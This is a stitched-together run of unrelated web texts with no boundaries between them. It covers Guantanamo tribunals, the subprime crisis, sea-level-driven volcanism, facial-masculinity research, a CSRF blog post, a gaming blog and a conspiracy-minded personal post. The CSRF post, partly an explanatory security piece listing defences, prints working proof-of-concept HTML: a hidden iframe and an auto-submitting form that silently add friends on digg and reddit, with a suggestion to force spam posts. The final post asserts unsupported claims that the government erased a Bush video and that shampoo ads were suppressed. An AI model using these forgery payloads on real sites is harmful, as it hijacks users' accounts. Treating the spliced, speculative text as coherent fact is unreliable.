The place seemed to be being smashed up . "
The Cedar Guest House refused to comment .

The U.S. war crimes tribunals at Guantanamo have betrayed the principles of fairness that made the Nazi war crimes trials at Nuremberg a judicial landmark , one of the U.S. Nuremberg prosecutors said on Monday .
" I think Robert Jackson , who 's the architect of Nuremberg , would turn over in his grave if he knew what was going on at Guantanamo , " Nuremberg prosecutor Henry King Jr. told Reuters in a telephone interview .
" It violates the Nuremberg principles , what they 're doing , as well as the spirit of the Geneva Conventions of 1949 . "
" The concept of a fair trial is part of our tradition , our heritage , " King said from Ohio , where he lives .
" That 's what made Nuremberg so immortal -- fairness , a presumption of innocence , adequate defense counsel , opportunities to see the documents that they 're being tried with . "

The answer to that question will be revealed over the coming months .
But the cast of characters who missed signals like the rise of delinquencies and foreclosures is becoming easier to identify .
They include investment banks happy to sell risky but lucrative mortgage debt to hedge funds hungry for high interest payments , bond rating agencies willing to hope for the best in the housing market and provide sterling credit appraisals to debt issuers , and subprime mortgage brokers addicted to high sales volumes .
What is more , some of these players now find themselves in a dual role as both enabler and victim , like the legions of individual borrowers who were convinced that their homes could only keep rising in value and were confident that they could afford to stretch for the biggest mortgage possible .
“ All of the old - timers knew that subprime mortgages were what we called neutron loans — they killed the people and left the houses , ” said Louis S. Barnes , 58 , a partner at Boulder West , a mortgage banking firm in Lafayette , Colo .
“ The deals made in 2005 and 2006 were going to run into trouble because the credit pendulum at the time was stuck at easy . ”
Oddly , the credit analysts at brokerage firms now being pummeled were among the Cassandras whose warnings were not heeded .
“ I ’m one guy in a research department , but many people in our mortgage team have been suggesting that there was froth within the market , ” said Jack Malvey , the chief global fixed income strategist for Lehman Brothers .
“ This has really been progressing for quite some time . ”
Others on Wall Street echoed Mr. Malvey ’s stance .
“ We ’ve contended for a while that there was an issue in subprime debt , ” said Neal Shear , global head of trading at Morgan Stanley .
“ A year ago , we were aware that delinquencies were going to rise . ”
A Ripple Expands
So why did many of the smartest minds on Wall Street somehow miss the signposts that these insiders now claim to have seen coming ?
Few professionals on the losing end of these trades are willing to talk publicly about how what started out as a crisis in an obscure corner of the credit market — subprime debt , for borrowers with weak credit — managed to infect stocks and bonds .
For example , officials at Goldman Sachs , Wall Street ’s most dominant firm , have provided little detail into how one of their hedge funds lost 30 percent of its value in just weeks .
Unlike most apparently intractable problems , which have a tendency to go away when examined closely and analytically , the climate change predicament just seems to get bigger and scarier the more we learn about it .
Now we discover that not only are the oceans and the atmosphere conspiring against us , bringing baking temperatures , more powerful storms , floods and ever - climbing sea levels , but the crust beneath our feet seems likely to join in too .
Looking back to other periods in our planet 's history when the climate was swinging about wildly , most notably during the last ice age , it appears that far more than the weather was affected .
The solid earth also became restless , with an increase in volcanic activity , earthquakes , giant submarine landslides and tsunamis .
At the rate climate change is accelerating , there is every prospect that we will see a similar response from the planet , heralding not just a warmer future but also a fiery one .
Several times in the past couple of million years the ice left its polar fastnesses
and headed towards the equator , covering much of the world 's continents in ice sheets over a kilometre thick , and sucking water from the oceans in order to do so .
As a consequence , at times when the ice was most dominant , global sea levels were as much as 130 m lower than they are today ; sufficient to expose land bridges between the UK and the continent and Alaska and Russia .
Each time the ice retreated , sea levels shot up again , sometimes at rates as high as several metres a century .
In the mid 1990s , as part of a study funded by the European Union , we discovered that in the Mediterranean region there was a close correlation between how quickly sea levels went up and down during the last ice age and the level of explosive activity at volcanoes in Italy and Greece .
The link was most obvious following the retreat of the glaciers around 18,000 years ago , after which sea levels jumped back up to where they are today , triggering a 300 % increase in explosive volcanic activity in the Mediterranean in doing so .
Further evidence for a flurry of volcanic action at this time comes from cores extracted from deep within the Greenland ice sheet , which yield increased numbers of volcanic dust and sulphate layers from eruptions across the northern hemisphere , if not the entire planet .
But how can rising sea levels cause volcanoes to erupt ?
The answer lies in the enormous mass of the water pouring into the ocean basins from the retreating ice sheets .
The addition of over a hundred metres depth of water to the continental margins and marine island chains , where over 60 % of the world 's active volcanoes reside , seems to be sufficient to load and bend the underlying crust .
This in turn squeezes out any magma that happens to be hanging around waiting for an excuse to erupt .
It may well be that a much smaller rise can trigger an eruption if a volcano is critically poised and ready to blow .
Eruptions of Pavlof volcano in Alaska , for example , tend to occur during the winter months when , for meteorological reasons , the regional sea level is barely 30 cm ( 12in ) higher than during the summer .
If other volcanic systems are similarly sensitive then we could be faced with an escalating burst of volcanic activity as anthropogenic climate change drives sea levels ever upwards .
Notwithstanding the recent prediction by the Intergovernmental Panel on Climate Change ( IPCC ) that sea levels in 2100 will be a measly 18 - 59 cm ( 7 - 23 in ) higher , Jim Hansen – eminent climate scientist and director of NASA 's Goddard Institute for Space Studies – warns that we could see a one to two metre rise this century and several more in the next .
Other climate scientists too , forecast substantially greater rises than the IPCC , whose prediction excludes any consideration of future changes in polar ice sheet behaviour .
A worst - case scenario could see a return to conditions that prevailed around 14,000 years ago , when sea levels rose 13.5 metres ( 44ft ) - the height of a three - storey house - in the space of about 300 years .
Such a dramatic rise in coming centuries would clearly spell catastrophe for our civilisation , with low - lying regions across the planet vanishing rapidly beneath the waves .
Just a one metre ( 3.28 ft ) rise would threaten one third of the world 's agricultural land , two metres ( 6.56 ft ) would make the Thames flood barrier redundant and four metres ( 13.12 ft ) would drown the city of Miami , leaving it 37 miles ( 60 km ) off the US coast .
As sea levels climb higher so a response from the world 's volcanoes becomes ever more likely , and perhaps not just from volcanoes .
Loading of the continental margins could activate faults , triggering increased numbers of earthquakes , which in turn could spawn giant submarine landslides .
Such a scenario is believed to account for the gigantic Storegga Slide , which sloughed off the Norwegian coast around 8,000 years ago , sending a tsunami more than 20 metres ( 66 ft ) high in places across the Shetland Isles and onto the east coast of Scotland .
Should Greenland be released from its icy carapace , the underlying crust will start to bob back up , causing earthquakes well capable of shaking off the huge piles of glacial sediment that have accumulated around its margins and sending tsunamis across the North Atlantic .
The Earth is responding as a single , integrated system to climate change driven by human activities .
Global warming is not just a matter of warmer weather , more floods or stronger hurricanes , but is also a wake - up call to Terra Firma .
It may be no coincidence that one outcome of increased volcanic activity is likely to be a period of falling temperatures , as a veil of volcanic dust and gas reduces the amount of solar radiation reaching the surface .
Maybe the Earth is trying to tell us something .
It really would be worth listening before it is too late .

Women see ‘ masculine ’ men as unsuitable long - term partners , new research suggests .
Conversely , the psychologists from Durham and St Andrews Universities found that men with feminine facial features are seen as more committed and less likely to cheat on their partners .
The study , published in the current edition of Personality and Individual Differences , asked over 400 British men and women to judge digitally altered pictures of male faces made to look more masculine or feminine .
The participants were asked to predict personality traits including sexual behaviour and parenting skills based on what they saw .
Men with masculine faces , with features such as a square jaw , larger nose and smaller eyes , were classed as significantly more dominant , less faithful , worse parents and as having personalities that were less warm , compared to their ‘ feminine ’ counterparts , who had finer facial features with fuller lips , wide eyes and thinner , more curved eyebrows .
A face graphically manipulated to look more feminine ( top left ) , more masculine ( top right ) , less healthy ( bottom left ) and more healthy ( bottom right ) .
Images copyright of PerceptionLab .
The scientists say the research , partly supported by the Medical Research Council and the Economic and Social Research Council , backs up earlier research about masculinity and perceptions of personality and gives further insight into what people see in others when choosing potential partners .
It will also advance studies in areas like evolutionary biology , fertility and genetics and offer new insights for relationship counselling and psychology .
Lead author , Dr Lynda Boothroyd , a lecturer with Durham University ’s Department of Psychology , commented : “ This research shows a high amount of agreement between women about what they see , personality wise , when asked to ‘ judge a book by its cover ’ .
“ They may well use that impression of someone to decide whether or not to engage with that person .
That decision - making process all depends on what a woman is looking for in a relationship at that time of her life . ”
The study asked participants to complete a web - based test .
Pairs of pictures which only showed the face without any hair , ears , neck , shoulders or clothing visible , were presented side by side .
The participants were asked to select which face they thought was more of a particular trait and how much more so by clicking on a point of the scale .
Traits selected for judgement were dominance , ambition , wealth , faithfulness , commitment , parenting , and warmth .
The survey also found that faces which appeared healthier , for instance those with better complexion , were seen as more desirable in terms of all personality traits compared to those who looked unhealthy .
Similarly , older faces were generally viewed more positively compared to younger ones .
Professor David Perrett from St Andrews University adds : “ Our research also found that it is men ’s health that conveys all round good qualities for partnership and personality .
Our results contradict claims that machismo denotes fitness and disease immunity .
Masculinity may buy you dominance but not necessarily tip top physical condition .
Instead women see a healthy guy as the source of wealth , and fit for family life . ”

It seems that digg has a poorly thought - out feature : a simple GET request to a particular URL can add a new friend to your account .
Create a page which makes the request to digg and * BAM * , any visitor of the page will add a friend to their account .
Here is the offending code :
< iframe src= " http://digg.com/invitefrom/russvirante " mce_src= " http://digg.com/invitefrom/russvirante " height = " 1 " width= " 1 " ></ iframe >
It looks like digg has closed the hole .
Now it returns a 302 response .
What should websites do to be protected from that kind of attack .
Using POST instead of GET right ?
Well it turns out using POST it is not enough to prevent CSRF attacks .
Let ’s demonstrate it with reddit .
Reddit , like digg , allows you to add friends to your account .
To do that you have to go to http://reddit.com/prefs/friends , type the name of the friend and press the add button .
Here is the code of that form :
< form action= " " method= " post " >
< input type =" hidden " name = " action " value= " add " / >
< input style = " margin : 0 px " type =" text " name = " name " />
< button class = " btn " type = " submit " > add</button >
</ form >
Note that POST is used for that form .
Imagine that I am a narcissistic blog writer ( not a too unlikely scenario ) and I want every visitor of my site to add me as their friend on their reddit account .
The only thing I have to do is create a page with the code snippet below and convince reddit users to visit it :
< iframe style = " width : 1 px ; height : 1 px ; visibility : hidden " name = " hidden " ></ iframe >
< form name = " redditcsrf " action = " http://programming.reddit.com/prefs/friends " method= " post " target = " hidden " >
< input type =" hidden " name = " action " value= " add " / >
< input style = " margin : 0 px " type =" hidden " name = " name " value= " monkeyget " / >
</ form >
< script>document.redditcsrf.submit( ) ;</ script >
This code makes a POST request , asking reddit to add a new friend .
An ajax request could also be used .
You can try it yourself :
Make sure you ’re logged in on reddit Create an .html file containing the code snippet above Open the html file in your browser
Now if you check on http://reddit.com/prefs/friends you ’ll see that a new friend has been added .
( Tested successfully with Firefox and Opera .
It did n’t work with IE .
Javascript must be enabled .
Your mileage may vary . )
This could be much more dangerous !
Imagine that I ’m not narcissist but greedy .
I could craft a page which forces the visitors of the page to creates new stories on reddit with their own account !
If I could trick enough reddit users to visit my page ( and that ’s not hard on a website like reddit ) then I could fill reddit with spam that would be hard to detect since they would be posted by legitimate users .
I could get filthy rich !
What can be done to be protected from CSRF attacks ?
Users :
Disable javascript .
Without javascript it ’s not possible to perform a POST request .
However I could trick the user to click on the button of a malicious form .
Also it would n’t prevent GET requests .
Set the browser to disable third party cookies .
That is refuse to receive AND send cookies to third party websites .
Internet explorer seems to do that ( with my settings at least ) .
Opera and firefox seem to have options to disable receiving cookies from third party website but I ’m not sure if it blocks the SENDING of cookies during a request to a third party site .
Website Developer :
Check that the request is a POST ( but as we ’ve seen that ’s not enough )
Check the referrer to make sure that the request does n’t come from a third party website ( would n’t work when referrer is disabled )
Use CAPTCHA ( highly annoying for the user )
The current best practice seems to be adding an hidden field to forms which contain a special value ( like a random value , the session - id , or the salted hash of a session - id ) and check for that value when a request is made .
That way CSRF would be impossible as long as the attacker ca n’t get or guess the value ( see http://shiflett.org/articles/cross-site-request-forgeries
Browser maker :
Refuse to perform any POST to another domain .
Unfortunately it would probably break a lot of applications
Never send cookies to other domains .
This would also break a lot of things
Ask a confirmation when such a potentially dangerous operation is performed .
Edit : Someone managed to exploit the vulnerability as to allow the creation of new stories : http://reddit.com/info/1e7za/comments

Z and I went over to my buddy John 's yesterday to borrow his XBox360 copy of Dance Dance Revolution .
I 've been avoiding this game for nearly ten years .
Partially because I can actually dance in real life ( my wife can attest to this , and as she 's an African , it 's high praise , let me tell you ) and DDR does n't seem like dancing to me , but also because I know I 'd get too into it .
But , John talked me into it and I talked my wife , begrudgingly , into playing it once .
We did n't stop until 30 songs later .
To quote my wife , " I wo n't stop until I get an ' A ' ! "
She did , on Rapper 's Delight , by the way .
I think that we took to this game for the same reason we took to the Wii - it 's so physically interactive .
After twenty years of twitch - gaming with a controller and my thumbs , and fifteen years of typing for a living , the last thing I want to do is come home and use a controller .
What so funny to me about Dance Dance Revolution to me is that it 's just another version of Simon - a frenetic real - time psycho game of Simon set to house music while dancing with much gnashing of teeth - but Simon nonetheless .
Really immersive gaming ( computing ) requires one of two things .
Either ...
... a controller that mirrors something in reality ...
Guitar Hero , another game I played at John 's ( loan that to me also , John ! ) , is basically the same thing - it 's Dance Dance Revolution with a fret .
Addictive , surely , and I 'm sure the wife will get a kick out of it , but it 's a little too close to typing for these hands .
The original Xbox had an amazing ( and VERY expensive ) game called Steel Battalion that included a custom controller with over 40 buttons .
It was brilliant .
We played it at work ( at lunch ) for months .
It was the most immersive gaming experience I 'd had short of going to an arcade and getting into one of those $ 100 K flight simulators .
Of course , the controller was $ 200 - as much as an Xbox .
We 've got to break out of this Mouse and Keyboard rut we 're in as a culture ( this includes you Quake and Unreal Tournament folks who insist a mouse and keyboard is the Only Way to Play - you 're not helping ! ) and move into the Minority Report Multi-Touch Interaction world that folks like Jeff Han are pioneering .
... or intuiting intent via hand gestures
Now , $ 30 k for something like Jeff Han 's solution is ( currently ) untenable , but surely with all these Web Cams along with the brilliance of folks like Ashish and his Gesture Recognition stuff or the amazing uMouse stuff that Larry Lart ( seriously , rush over there , now and read what he 's doing ) is working on ( Hopefully I 'll get a review of his stuff and he 'll get a download link up soon .
He said it 'll be in beta the next week or so . ) should give us some reliable moving of windows using our hands .
I figure it can't be that hard to watch a hand with a webcam , and that combined with the fact that there 's only so many windows at a time on the screen - that lowers / narrows the number of things you 'd want to do .
Fine control of the mouse via gestures is a start , but a REALLY compelling solution would augment the mouse by using the web cam to track your hands and allow the push windows from monitor to monitor in a multimon scenario , minimize windows , launch Google , etc .
Certainly we could make it even easier by putting things on our hands ( video of Atlas Gloves and Google Earth ) and making the functionality very specialized .
Frankly I 'm surprised that BillG would put so much work into Voice Recognition and Tablet but miss out on the opportunity to revolutionize User eXperience via a simple webcam .
I do n't need my webcam or computer to tell me if I 'm sad - I 'd like it to recognize my intent and act on it .
There 's lots of Alternative Pointing Devices to choose from , but they all fall into the same tired metaphors .
As mice go , personally I really like the Evoluent Vertical Mouse ( it does n't turn your hand unnaturally ) and I also have Tablets for all my computers .
I love my Ergodex , but I do n't use it for coding like I used to .
I 'm convinced that gestures are the next big thing - and no , I do n't mean mouse gestures .
It 's a huge shame that the Fingerworks guys went out of business .
Their pad was brilliant .
I know Rory is a huge fan of their iGesture pad .
It was just too expensive .
All these mechanisms are tired shadows of what a good gesture system could do .
Making cheap webcams recognize our hand gestures - even if I have to point the camera at my hand on the mouse - has huge potential .
This is a 100 % solvable software problem .
Of course , the real tragedy in all this ?
I 'll never dance ( or , " Dance Dance " rather ) as well as this five - year - old .
There is a peculiar thing in my own experience that is not Déjà Vu , but nor does it seem to be any other phenomenon that I have ever heard of .
I guess it might qualify for an odd version of a Precognition .
I am open to any assistance to locate what should be really easy to find evidence !
George W. Bush became President in January 2001 .
I did n't think he seemed especially smart but otherwise I had no opinion of him good or bad .
But then on June 14 , 2001 I was with a couple friends visiting while a TV was on .
There was a TV interview of George W Bush , in itself a rather rare incident .
In THAT conversation with Göran Persson , the Prime Minister of Sweden , on a National Network , we all heard Bush say regarding Saddam " He tried to kill my daddy ! "
I immediately said " My God !
We are going to go to war and attack Iraq ! "
And then all three of us laughed about a President referring to his " daddy " as really a strange thing to say in that way .
Notice that this was THREE MONTHS BEFORE the 9/11 attacks .
Within a few days of 9/11 , Cheney and Bush were already referring to invading Iraq , and reporters would ask , " Did Iraq even have anything to do with the 9/11 attacks ? "
Of course , they did n't .
OK .
None of this should seem strange , right ?
But the three of us SAW BUSH SAY IT TO PERSSON ON LIVE TV !
EXCEPT for the fact that news reports of more than a year later ( Sept 26 , 2002 ) are the first ones that seem to be findable on the Internet , which refer to a slightly different wording of the " daddy " comment , and they were given by Bush while standing behind a Podium at a Press Conference .
SO !
Did my friends and I see some event on LIVE TV that never actually happened on June 14 , 2001 ?
It seems inconceivable that the Internet would not have both a transcript and the actual Network video of something as rare as a televised News Interview of President Bush .
Do n't Networks keep Archives of everything they air ?
They CLAIM to !
I do n't see how such an important videotape could have gotten DELETED from all records !
I am not a Sociologist , but if it can be seen that Bush had that terrifying expression ( 6/14/01 ) as he mentioned the daddy comment and other amazing personal hatred for Saddam , and then less than three months later ( 9/11/01 ) , he and Cheney were publicly talking about invading Iraq to get rid of Saddam , it sure seems TO ME to be a direct causal connection !
I could easily imagine that the Bush people would have wanted to cause all records of that comment to be deleted , but it seems kind of but I cannot imagine any of the News Networks agreeing to do that .
How could Bush ' delete important history ' which was centrally about the important Kyōto Protocol ( regarding global warming , which Bush denied was actually occurring ) , and also an important Kyōto Conference for the legacy of Göran Persson ?
Is ANYBODY so powerful such that they could ' revise history ' just to keep the world from learning about a truly stupid comment he had made on LIVE TV ?
It seems fairly certain that the interview we watched was aired , LIVE , on either ABC News , NBC News , CBS News or FOX , as I do n't think I watched any other networks at the time .
( I later added the BBC News to my interest . )
( I admit that someone else might have turned on that TV and it may have been some other network . )
Now , I KNOW that interview occurred , and so do my friends !
But IF that interview occurred , how could it be possible that no one else ( in the world ? ) seems to be aware of it ?
There could n't have been ten Presidential Interviews in all of 2001 !
But , IF such an interview had not really ever happened , how could the three of us have discussed it ?
And how could I / we have already known when the comment was repeated more than a year later , on Sep 26 , 2002 ?
How could I even know that Bush was to the right on the screen and Prime Minister Persson was to the left of him , and that they were both sitting next to each other ?
( For the record , in the years that these comments have been on the Internet , at least thirty different people have e-mailed to inform me that they also had seen the chilling comment we three had watched on live TV .
Several of them have expressed even more impressive reactions than I had upon seeing it , and all added their own comments regarding the terrifying look on Bush 's face as he said it . )
In late 2013 , I learned that a Reporter for the New York Times , a Frank Bruni , did a story regarding that event , where he referred to Bush continuing to talk after he thought the cameras were turned off .
But Bruni 's article does not mention the ' daddy ' comment but mentions some other personal comments he made to Persson .
There is a special reason why that scene was so momentous .
The expression on Bush 's face and the matter - of - factly way he made the statement was bone - chilling !
I have only ever once before seen that expression on any person .
It was a Syndicate Mobster who had just been caught by the Police .
He clearly knew that he was going to soon be released , and was unconcerned .
But he made a statement to a Reporter that was virtually identical to Bush 's comment .
The Mobster very calmly mentioned to that Reporter that a Gangster from a different Family had recently killed his sister .
HIS EXPRESSION was like Bush's !
In seeing the Mobster make that cold and definitive statement , there was NO doubt that the offending Mobster would very soon be killed , which was in the news a few days later .
That was the ONLY time I have ever seen ANY person have that expression that Bush had when he made the ( June 14 , 2001 ) Daddy comment .
It was almost as though he was stating that he was going to murder Saddam , exactly like the Mobster who made the similar statement .
People really need to SEE that videotape !!!
And , concurrently , they need to HEAR Bush implicitly make clear that he was going to use the Presidency to murder Saddam Hussein !
I realize that you do not believe my impression , and it is CRITICAL that you see and hear it yourself .
It was n't that Bush could have been convicted of murder for that statement , but it sure seemed very close !
I guess I might have also seen Charles Bronson have that expression when delivering similar news about his dead wife or son in some movie , but I can not say for sure .
It is such a definitive expression and way of making a statement , that there is NO possible doubt as to what the speaker means .
Does that mean that Bush was already planning pre-meditated murder ?
I am not sure we could go that far , but when you see that videotape , I assure you that you will certainly consider that thought !
I suppose this is not a world - shaking problem !
However , IF that interview actually took place , the implications are incredible .
The fact that comment was made BEFORE 9/11 really made extremely clear to me that Bush really was hoping for some excuse to invade Iraq , and 9/11 then just happened to provide it .
However , if my memory was totally wrong ( which , for a research Nuclear Physicist would be rather unusual ! ) , and the findable references were correct , then Bush ( in late 2002 ) seemed to just be adding to an existing ( alleged ) WMD issue with his personal feelings a year afterward .
That is incredibly different !
So , if there is anyone who can figure out how to find any record of a rather rare Presidential Interview on June 14 , 2001 on a major Network , I feel that I can guarantee that that interview contains the exact sentence , rather casually said : " He tried to kill my daddy . "
The comment was NOT made toward the camera , but only after having leaned over to apparently make a personal comment to Prime Minister Persson .
I also remember that the other person had a rather surprised expression , while Bush had essentially none , except that strange smile he usually has .
It was terrifying to watch , somewhat resembling the interviews with caught mass murderers who seem to have a very strange expression on their faces .
I would really appreciate if anyone can confirm this either way !
If it can be confirmed that Bush gave NO interviews on June 14 , 2001 , I guess I would have to accept it .
Except I and others SAW it !
( Oct 2007 ) .
A wonderful person in Ireland apparently saw the same televised interview , and he did extensive research in actually identifying it !
It HAPPENED !
It occurred on the afternoon of June 14 , 2001 , in Gothenburg , Sweden .
A mutual Press Conference of Mr. Bush and the Prime Minister of Sweden , Göran Persson had just concluded , and it had been aired on live TV , apparently world - wide .
Prime Minister Persson was then the President of the European Union .
The Press Conference was about a number of subjects , centrally including the Kyōto Protocol ( which Bush would not agree to and was violently against . )
When the Press Conference was done , Mr. Bush apparently thought that the cameras had been turned off , but they were still running and their signal was still being sent around the world in real - time .
Bush then leaned over and made that amazing personal comment to Mr. Persson regarding Saddam Hussein : " But he tried to kill my daddy " , which therefore went out on live TV and US network feeds ( which is what we saw ) .
As a scientist , this now brings up all sorts of NEW issues !
First , the Official White House Transcript of that day does NOT contain that statement by the President !
( Is n't an Official Transcript supposed to include ALL events that happened ?
Most even refer to coughs , sneezes and pauses ! )
Second , clearly , such an amazing , and strange , statement by the President of the United States , was certainly immediately shared with countless television Networks around the world , and so they should NOW all have copies of it in their Archives .
However , it appears that there is NO videotape copy now in existence !
Or even any REFERENCE to the event even having happened !
How is that possible ?
I cannot even discover what Network 's camera was still rolling when Mr. Bush made that comment !
There are virtually NO records or references to that comment anywhere !
A search on the Internet certainly has MANY references to nearly the same comment made on Sept 26 , 2002 , but the implications of him having said it BEFORE 9/11 seem to suggest the possibility that Bush was even then already looking for some excuse to attack and kill Saddam , and that 9/11 was simply seen by Bush and his administration as the perfect excuse for invading Iraq .
Does n't that essentially qualify as premeditated murder ?
Even though Iraq had absolutely nothing to do with the events of 9/11 , Bush and his group insisted that it was URGENT that they attack Iraq !
Now , with that video , it makes more sense WHY they did that !
It was personal !
We had over 4,000 Servicemen die and we spent over a trillion dollars , apparently because a kid wanted revenge on someone who had threatened his father .
And when you are President of the United States , it appears that you can obtain your vengeance .
EIN News ( apparently of Sweden ) might have been responsible for the cameras that day , as they seem to have kept daily coverage of Mr. Persson , but I have been unable to find if they have any Archives of videotapes .
I have seen references where EIN News carefully amasses every bit of media content which is related to Göran Persson , as they intend to some day publish an Official Memoir of his time as Prime Minister of Sweden .
So , a LOT of media archives SHOULD contain copies of the events of June 14 , 2001 in Gothenburg , Sweden , but EIN News seems certain to have saved it .
This is all VERY weird , especially since it has now been confirmed that we DID see the President make that strange comment THREE MONTHS BEFORE the 9/11 attacks !
Now , I want even more to actually see some Transcript of that portion of that meeting , and also actually see the videotape .
As I noted above , the expression on Mr. Bush 's face was incredibly chilling , as THAT was the reason I realized at that moment that he intended to attack Iraq .
HEY !
Someone located a copy of a video !
I received this e-mail late in Sept 2009 : Mr. Johnson , I found that clip .
My buddy bet me a $ 1000.00 it was never said .
He lost !
I KNEW I saw that speech , it bothered me deeply .
I saw the whole speech , and it was pretty clear he had it out for him .
Regardless of 911 .
Shortly afterwards I quit the Republican Party and became an Independent .
Richard
They have 3 0r 4 different players to see watch it on .
http://archive.org/details/Bush-ThisIsTheGuyThatTriedToKillMyDad
We also have this ( Sept 26 , 2002 ) videotape here .
Unfortunately , this videotape that he found was the one which occurred on Sept 26 , 2002 , in Texas , where Bush was standing alone at a Podium , long AFTER the 9/11/01 attacks .
Also , in this tape , which is of a ( standing ) speech , Bush is in a high - spirited mood , somewhat smiling and light - hearted about the matter .
That is in incredible contrast with the 6/14/01 comment , where he had been seated and his expression was the most spectacular aspect of the comment .
Deadly serious appearing , with the full impression that he intended to somehow wreak personal revenge , which the 9/11/01 attacks provided for him as an excuse .
( This man 's comments , regarding being extremely emotionally affected by seeing the comment , indicates that he may have also actually saw the same one I saw , the one on 6/14/01 and not the light - hearted one of this videotape . )
So it still appears that there may be NO EXISTING COPY of the live telecast which I personally saw on 6/14/01 !
The mystery continues .
And IF some viewer happened to have had a VCR going to capture a copy of it on that day , that will then center a focus on all the TV Networks that certainly USED TO HAVE a copy of that video but now they would need to explain why their Archives seem to no longer contain that video .
Maybe if ONE Network would lose a video , but when ABC - Chicago and ABC - New York and ABC - Los Angeles and all the others each aired it , along with the other networks , how could they ALL have lost such an important videotape ?
Even Networks that did not air it that day , would have received a satellite - feed of that videotape , such that they might consider airing it or excerpting it for their News broadcasts .
Logically , there should be at least 50 Archives in the US that should have recorded and saved that video , as they do ALL news segments !
There is NO logical explanation for how ALL of them could now not have it , except for an intentional action on the part of the Bush government to force them all to delete it .
I can imagine that the reasoning might have been that the President looked really bad , but can the ( US ) government actually force all the TV networks to dispose of what would now be an immensely important videotape ?
Is n't America supposed to be different from that ?
It might be appropriate to note that the Bush government later DECIDED to destroy more than 90 videotapes of waterboarding ( torture ) when they realized that they would look very bad if anyone ever saw those tapes .
So ethics and principles seem not to have had much importance .
I still do not see how supposedly INDEPENDENT businesses , television networks , would have ever agreed to dispose of an important videotape , just because it made the President look like a jerk .
Would they all have done that ?
If so , it is terrifying for a Fourth Estate reason !
I guess while I am on this sort of thing , there is another thing I saw that I guarantee that I actually saw !
Nothing weird here , just a little bothersome .
And it has absolutely NOTHING to do with Déjà vu !
There is a product that started being advertised for men to grow hair , called Rogaine , in the early 1990s .
It achieved some success ( and is still being sold ) .
Late in April , 1996 , Upjohn ( the manufacturer ) decided to start advertising to women , to try to sell even more products .
Here 's the interesting part .
They started broadcasting DIFFERENT commercials for men and for women .
For maybe a little over a month ( May 1996 ) , the new TV ads to women included a statement where women were losing hair BECAUSE OF THE STRENGTH OF MODERN SHAMPOOS .
I remember thinking , wow , the shampoo industry can NOT be pleased with that !
But I think they were actually noting that long ago , virtually no woman lost her hair , that virtually all women still had their hair in extremely old age .
It was even CALLED " male pattern baldness " because it only happened to men !
Well , now , that concept was quite interesting !
Clearly , Upjohn would only have invested hundreds of thousands of dollars to MAKE such commercials and more hundreds of thousands of dollars to air the new advertising toward women , if they KNEW that there was a large enough market , that is , that millions of women were now losing their hair !
One would think that Upjohn would have had experts make very certain that every statement in a NEW commercial was solidly truthful and accurate .
We can probably figure that the shampoo manufacturers must have immediately contacted Upjohn with severe legal threats and those ads quickly disappeared from all TV advertising , and a different reason was put in its place , that of a genetic disposition because a woman 's mother had been susceptible to losing her hair .
However , this new reason seemed rather silly , as virtually no older women had ever lost much hair , until fairly recently .
Those replacement commercials also soon disappeared and a variation of the male pattern baldness reasoning then took over , still used to this day .
SOOOO !
Does this mean that their initial ads were correct ?
That women are now losing hair because the modern hair care products they buy are so strong ?
Or was Upjohn so incompetent as to spend millions to create a commercial that was not true ?
If so , should n't women be provided with this information ?
However , we note that the sales of billions of dollars of hair care products would plummet !
Are the ethics of modern business so profit - centered that they are willing to cause millions of women to lose their hair just to get greater profits in hair care products ?
Boy , I hope not , but I wonder !
Specifically , I discovered that there seems to be no record of those early women 's TV ads of May 1996 that exist anywhere , nor even any reference to any such thing .
There are references to the fact that Upjohn was ABOUT to start such advertising to women at the end of April 1996 , but then no references whatever afterwards !
There is little doubt that the hair care / shampoo corporations would have tried to delete that from history .
Did they succeed ?
As far as I can tell , they did !
As a side note on this matter , HUNDREDS of people have viciously attacked ME regarding this !
They go on and on about ME improperly blaming shampoos and the rest .
They apparently do not carefully read the foregoing text , as I personally have absolutely NO opinion either way about the matter !
I merely SAW a dozen TV commercials that stated those things that struck me as pretty amazing !
Kill the messenger ???
An interesting recent addition is that in early 2009 , a company is presenting something on TV in infomercials called Wen .
These new infomercials keep repeating all the damage that modern shampoos do to hair , to promote their claim of not being a shampoo .
It sure sounds a LOT like the claims I heard in those May 1996 Rogaine for Women commercials regarding about how strong and destructive to hair that modern shampoos are !
The new Wen infomercials do not directly say that shampoos cause hair to fall out , but they IMPLY the same thing !
They refer to the fact that women accept that strong modern detergents cause clothing fibers to disintegrate , and then make a reference to a similar effect of strong modern shampoos .
I guess that is not actually saying that shampoos cause hair to fall out , but it sure sounds close !
As near as I can tell , that product Wen and its company quickly disappeared !
Do n't mess with the giant hair care corporations !
A related matter is that in January 2015 , a company called Keranique is running TV commercials that say that there are thirty million American women who are losing their hair !
And the implication in those commercials is that a prime culprit are powerful cleaning chemicals in women 's shampoos !
In 2015 , a LOT of Wen TV commercials have started filling the air , and they are pretty aggressive about criticizing all women 's shampoos .
It is remarkably similar to the commercials I saw twenty years earlier that initiated my comments above .
It seems that it took twenty years before the women 's shampoo industry finally accepted the outrageous things I saw in 1996 in that brief spat of TV commercials .
The implications of both these things , the Bush Daddy comment before 9/11/01 and the Rogaine for Women commercials of May 1996 , are really terrifying .
Can our government or a giant corporation really totally delete all references to some undesirable incident from the entire world 's memory and knowledge ?
And apparently all video archives as well ?
If so , we should all really be very , very scared !
So , if someone with far better Internet search skills than me can locate Transcripts and videotapes of the Bush Daddy comment of June 2001 , or Transcripts and videotapes of the Rogaine for Women TV commercials of May 1996 , I would be greatly comforted !
Just to know that SOME records of undesirable events CAN be preserved !
That history cannot simply be re-written by those with enough power .
Now , some people seem to read this as though I am some sort of " conspiracy theorist " .
That is NOT the case !
I really have no personal reason for thinking about such things one way or another .
But as a good scientific researcher , I do NOT EVER rely on speculations or silly concepts , but instead always attempt to pursue whatever is the actual truth in any situation .
When things " do n't seem to add up right " , I tend to notice such lack of logic and I try to investigate .
If somebody would get reliable evidence that gravity sometimes did not work right , I would be similarly interested in investigating !
OK .
One MORE subject to bring up , one that actually might be closer to the nerve signal passage delay of this Déjà vu presentation !
For many years , I have noticed that if I VERY carefully watch any standard TV , I definitely HEAR the words of a " talking head " a fraction of a second BEFORE I see the images of the mouth moving .
Not very long , only around 1/10 second .
Logically , it should be the other way around , because the light should get to my eyes virtually instantly while the sound can only travel at the far slower speed of sound .
For most of these years , I had attributed that to some INTENTIONAL plan on the part of broadcasters , although I never could figure out WHY they might do that !
IF I was around a hundred feet from the TV set , the ( earlier ) sound would take around 1/10 second to propagate through the air to get to me , and the picture and sound would then appear to exactly match up .
